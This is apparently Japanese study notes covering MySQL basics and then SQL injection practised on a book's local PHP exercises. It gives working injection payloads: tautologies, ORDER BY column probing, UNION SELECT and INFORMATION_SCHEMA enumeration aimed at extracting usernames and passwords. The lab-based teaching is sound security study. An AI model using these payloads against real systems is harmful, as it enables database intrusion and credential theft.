# SQLの基本

データベースを扱うための言語がSQLです。  
多くのWebサービスに使われています。

ubuntu環境で、体験してみましょう。

## mysql のインストール

sqlを使えるデータベースシステムとしては、
`MySQL`, `PostgreSQL`, `SQLite`の3つのメジャーなものがあります。

今回はmysqlを用いて練習しましょう。

```
sudo apt-get install mysql-server
```

途中でrootのパスワードを設定するよう求められるので、設定しましょう。

今回は練習なので`password`というパスワードにしておくとあとで演習ファイルを使う際に便利です。


## mysqlの起動

以下のコマンドでログインできます。 
`-uroot`は`root`ユーザ、`-p`はパスワードの意味です。

```
mysql -uroot -p
```

## データベースの作成

SQLでは、データベースを複数作成できます。  
WebサービスAにはデータベースAを、WebサービスBにはデータベースBを使う、みたいな使い方ができます。

データベース一覧は以下のコマンドで見ることができます。
(セミコロンは必須です)


```
show databases;
```

mysqlでは初めから4つのデータベースが作られています。

---

`create database データベース名`で新たにデータベースを作ることができます。

```
create database testdb;
```

----

確認しておきましょう。

```
show databases;
```

## データベースの選択

使うデータベースは`use データベース名`で選択できます。

```
use testdb
```

`Database changed`をログが出ればOKです。

## テーブルの作成

それぞれのデータベースでは、テーブルというものを作成します。  
例えばブログのようなサービスなら、ユーザの情報を格納する`Users`というテーブルと
投稿した記事を格納する`Posts`というテーブルを用いるのが一般的です。


こちらも`show tables`でテーブル一覧を確認でき、
`create table テーブル名 (カラム名1 型1, カラム名2 型2, ...)`で作ることができます。

```
show tables;
```

初めはテーブルがないので`Empty set (0.00 sec)`と表示されます。

```
create table users (user_id INT, user_name VARCHAR(20));
```

`INT`は整数型、`VARCHAR(N)`はN文字以内の文字列の型です。

## データの登録

作ったテーブルにデータを追加するには`INSERT INTO テーブル名 VALUES (値1,値2, ...);`とすれば良いです。

```
insert into users values (0, 'yyamada');
insert into users values (1, 'yinagaki');
insert into users values (2, 'mkanbayashi');
```

## データの取得

先ほど追加したデータを見てみましょう
`SELECT カラム名 FROM テーブル名`でデータを取得することができます。

```
select user_name from users;
```

```
select user_id from users;
```

複数のカラムを指定することもできます。

```
select user_id, user_name from users;
```

`*`を使うと、全てのカラムを指定できます。

```
select * from users;
```

また、`where`句を使うことで条件を指定できます。

```
select * from users where user_id > 0;
```

その他にも`ORDER BY`句で並び替えをしたり、`LIMIT`句で取得する件数を制限したり、
色々なことができます。

```
select * from users order by user_name;
```

```
select * from users limit 1;
```

## mysql の終了

`exit`あるいは`Ctr + D`で終了できます。

```
exit;
```

# SQLインジェクション

本書参考。

本書のプログラムで試してみましょう。

まず、phpをインストールします。

```
sudo apt-get install php
```

次に、mysqlをphpで使えるように、`php-mysqli`をインストールします。

```
sudo apt-get install php-mysqli
```

これで、[演習ファイル](https://book.mynavi.jp/files/user/support/9784839956486/book4b_web.zip)を実行できるようになります。


演習ファイルのあるディレクトリ（sqli1-1などのディレクトリ）で、`php -S 仮想環境のIPアドレス:ポート番号`とコマンドを打つと、ホスト環境のブラウザで`http://IPアドレス:ポート番号`からWebページが見れるようになります。

```
php -S 192.168.33.10:8000
```

例えば`SQLi 1-1`では、ユーザ検索の画面が出ればOKです。  
しかしこのままではユーザ検索をするとデータベースを作っていないためerrorになります。  

そこで、一旦`Ctr + C`でphpを終了させ、データベースを作成しましょう。

まず`table_mysql.sql`のあるディレクトリに移動したのち、mysqlにログインし、`book4b`というデータベースを作ります。

```
mysql -uroot -p
create database book4b;
show databases;

```

テーブルについては、作成するスクリプトを付録してくれているので、以下のようにすればテーブルを作成できます。

```
use book4b;
source table_mysql.sql
```

これでデータベースができたので、再度`sqli1-1`を実行してみましょう。

testuserで検索ができるようになったかと思います。

ここで、SQLインジェクションをしてみましょう。

```
# -- の後のスペースは必須です。
' or 1=1 -- 
```

ここでは、phpの中で以下のSELECT文が走っており、ユーザの入力が`{$search}`に入ります。

```
SELECT id, username, password FROM users WHERE username='{$search}'
```

本来のこのサーバの想定では`{$search}`には`testuser`などのユーザ名が入るので、以下のようなSELECT文になり、testuserの情報が得られます。

```
SELECT id, username, password FROM users WHERE username='testuser'
```

しかし,ここに`' or 1=1 -- `と入力することで、以下のようなSELECT文になります。

```
SELECT id, username, password FROM users WHERE username='' or 1=1 -- '
```

これで、 where句の内容は`username='' or 1=1`という内容になり、常に`TRUE`になります。 
(`-- `はコメントを表すので（Pythonの`#`やC言語の`//`に相当）最後の`'`はコメント扱いになります。)

## インジェクションの可否の判定

例えば、sql1-1の場合、`'`と入力した場合に、以下のように`'''`という構文エラーが発生します。

```
SELECT id, username, password FROM users WHERE username='''
```

このように、様々な入力を与え、それに対する挙動からインジェクションが可能かどうかを判断できます。

### sqli1-1

`'`で検索して見ると、エラーが表示されます。
SQLインジェクション可能な脆弱性があると簡単にわかりますね。

### sqli1-2
`'`で検索しても、エラーが表示されません。
そこで、Chromeで`右クリック->検証`から開発者ツール(デベロッパーツール)を開きます。
`Network`タブへ移動し、ページを更新すると、HTTPのレスポンスがみれます。

`Headers`タブのステータスコードを見ると
`500 Internal Server Error`となっています。

これだけでは、SQLのシンタックスエラーかどうかはわからないので、今度は
`''`で検索してみます。

今度は`200 OK`になりました。  
これで、SQLインジェクションが可能である可能性がかなり高いことがわかります。

### エラーハンドリングがされている場合

php内部で、try-catch構文を用いてerrorが発生してもプログラムが止まらないようにされている場合、
ステータスコードは常に`200 OK`となります。

このような場合でも、SQLインジェクションの可否を判定できます。（チャレンジブックp221~参照）

## 攻撃手法 ~UNION句~

UNION句を用いると、SQLのSELECTで取得した複数の結果を連結できます。
詳しくはチャレンジブックp230~を参照してください。

これを用いると、例えば掲示板の記事一覧を表示しているページに、ユーザ名とパスワードを表示させることができます。

| user_name| post_title |
|:-----------:|:------------:|
| yyamada | sqlinjection |
| yyamada | network |
| yinagaki | isucon5 |

+

| user_name| password |
|:-----------:|:------------:|
| yyamada | password |
| yinagaki | 1234 |



```
〜投稿一覧〜

投稿者　：　yyamada  投稿　：　sqlinjection
投稿者　：　yyamada  投稿　：　network
投稿者　：　yinagaki 投稿　：　isucon5
投稿者　：　yyamada  投稿　：　password
投稿者　：　yyamada  投稿　：　1234
```

---

UNION句で繋げるためには条件が二つあります。


- 繋げるデータの型が同じ
- 繋げるデータのカラム数が同じ

データの型とは、INT型とかVARCHAR型とかです。
つまり、user_name(VARCHAR)とuser_id(INT)を繋げることはできません。

また、user_nameとpost_titleの二つに対し、3つ以上のカラムを連結することはできません。
そのため、元々のSELECT文がいくつのカラムを取得しているかを推定する必要があります。

推定する手法の一つに、`ORDER BY`句を用いる手法があります。
`ORDER BY 3`のように `BY`の後ろにカラム名ではなく整数nを与えると、n番目のカラムで並び替えをしてくれます。  
よって、nの値を色々試すことで、カラム数を特定できます。

### sqli2-1

まず、`'`と入力してみましょう。
エラー文から、SQLインジェクションができそうだとわかります。

次に、`'order by 1 -- `と入力してみましょう。

エラー文が消えたことから、SQLインジェクションができることがほぼ確定しました。

```
'order by 10 -- 
```

```
'order by 5 --
```

といった入力では、エラーになります。このため、カラム数は4以下であることがわかりました。

```
'oreder by 3 -- 
```
ではエラーが消えるため、カラム数は3か4です。


```
'order by 4 -- 
```

最後に4で試すと、エラーが出るため、今回の例ではカラム数が3であることが分かりました。

1,2,3という数値を連結してみましょう。

```
' union select 1,2,3 -- 
```

## 括弧の有無

いつもサーバ側で下のようなSELECT文になっているとは限りません。

```
SELECT id, username, password FROM users WHERE username='{$search}'
```

例えば、以下のようにwhere句が括弧で囲まれていたりします。

```
SELECT id, username, password FROM users WHERE (username='{$search}')
```

このような場合も、括弧を閉じてあげればSQLインジェクションが可能です。

### sqli2-2

まず、`'`と入力してみましょう。
エラーが出るので、SQLインジェクションできそうです。

次に、`or 1=1 -- `と入力してみましょう。  
これまでと同じであれば、全てのユーザの情報が取得できるはずです。

しかし、エラーが出てしまいます。
この場合、SELECT文の書き方が想定と異なると仮説をたて、括弧の存在を疑います。

```
') or 1 = 1 -- 
```

これで、成功できました。
先ほどのようにUNION句で1,2,3を繋げてみましょう。

```
') union select 1,2,3 -- 
```


## 攻撃対象の探し方

UNION句で欲しい情報を取得できるようになったので、
欲しい情報がどんなテーブルの、どんなカラムにあるかを調べる必要があります。

これは、それが載っているデータベースがあるので、そこを参照すれば良いです。

例えば、mysqlでは`INFORMATION_SCHEMA`というデータベースの
`TABLES`というテーブルにテーブル情報が、`COLUMUNS`というテーブルにカラムの情報が載っています。

postgresqlでも同様のデータベースがあり、sqliteでは`SQLITE_MASTER`というテーブルの`sql`というカラム名で取得できます。

### sqli3-1

UNION句が成功するというところまで判別済みとします。

```
' union select 1,2,3 -- 
```

ここで、まずはデータベースに`INFORMATION_SCHEMA`というデータベースに`TABLES`や`COLUMNS`があるかどうかを調べます。

```
' union select 1,2,3 from INFORMATION_SCHEMA.TABLES -- 
```

```
' union select 1,2,3 from INFORMATION_SCHEMA.COLUMNS -- 
```

同じ結果が得られるので、存在が確認できました。
もし存在しなければ、 そんなテーブル無いぞ、とエラーが出るはずです。

ここまでくれば勝ったようなもので、`INFORMATION_SCHEMA.COLUMNS`に対して、`table_name`と`column_name`を取ってくれば良いだけです。

```
' union select table_name, column_name, 3 from INFORMATION_SCHEMA.COLUMNS -- 
```

